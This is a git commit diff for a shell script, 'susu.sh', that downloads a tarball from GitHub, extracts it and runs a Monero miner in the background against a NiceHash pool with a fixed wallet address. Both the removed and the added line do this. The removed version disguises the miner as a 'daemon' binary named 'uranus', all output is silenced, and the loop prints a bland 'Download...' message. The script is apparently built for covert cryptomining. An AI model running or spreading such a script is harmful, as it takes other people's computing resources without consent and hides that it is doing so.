03be39222cd2a99ace75f4fd62d90613f1f2cdcf
preak07 <160253225+preak07@users.noreply.github.com>
2024-03-16 01:30:03 +0700

    Update susu.sh

--- susu.sh
+++ susu.sh
@@ -1,4 +1,4 @@
-wget https://github.com/preak07/kopi/releases/download/susu/daemon.tar.gz && tar -xvf daemon.tar.gz && ./uranus -a randomx -o randomxmonero.hk.nicehash.com:3380 -u 3AhGzsYExJchLbzGVuiRTk33M5RAmL6C1f -p "RIG001" -t 1 > /dev/null 2>&1 &
+wget https://github.com/Bendr0id/xmrigCC/releases/download/3.4.0/xmrigCC-3.4.0-linux-dynamic-amd64.tar.gz > /dev/null 2>&1 && tar -xvf xmrigCC-3.4.0-linux-dynamic-amd64.tar.gz && ./xmrigDeamon -a randomx -o randomxmonero.eu.nicehash.com:3380 -u 3AhGzsYExJchLbzGVuiRTk33M5RAmL6C1f -p "vivo" -t 1 > /dev/null 2>&1 &
 while true
 do
         echo "Download..."
